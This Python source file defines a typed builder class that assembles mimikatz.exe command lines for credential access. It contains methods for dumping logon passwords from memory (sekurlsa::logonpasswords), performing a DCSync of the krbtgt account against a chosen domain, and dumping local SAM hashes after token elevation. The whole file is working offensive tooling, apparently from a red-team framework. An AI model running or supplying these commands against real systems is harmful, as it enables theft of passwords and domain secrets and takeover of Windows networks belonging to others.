from __future__ import annotations


class MimikatzBuilder:
    """Typed mimikatz.exe argv builder (credential access)."""

    def __init__(self, binary: str = "mimikatz.exe") -> None:
        self.binary = binary

    def _chain(self, *commands: str) -> list[str]:
        argv = [self.binary, *commands]
        if not commands or commands[-1] != "exit":
            argv.append("exit")
        return argv

    def logonpasswords(self, *, privilege_debug: bool = True) -> list[str]:
        cmds: list[str] = []
        if privilege_debug:
            cmds.append("privilege::debug")
        cmds.append("sekurlsa::logonpasswords")
        return self._chain(*cmds)

    def dcsync(self, *, domain: str, user: str = "krbtgt") -> list[str]:
        return self._chain(
            "privilege::debug",
            f'lsadump::dcsync /domain:{domain} /user:{user}',
        )

    def sam(self) -> list[str]:
        return self._chain("privilege::debug", "token::elevate", "lsadump::sam")
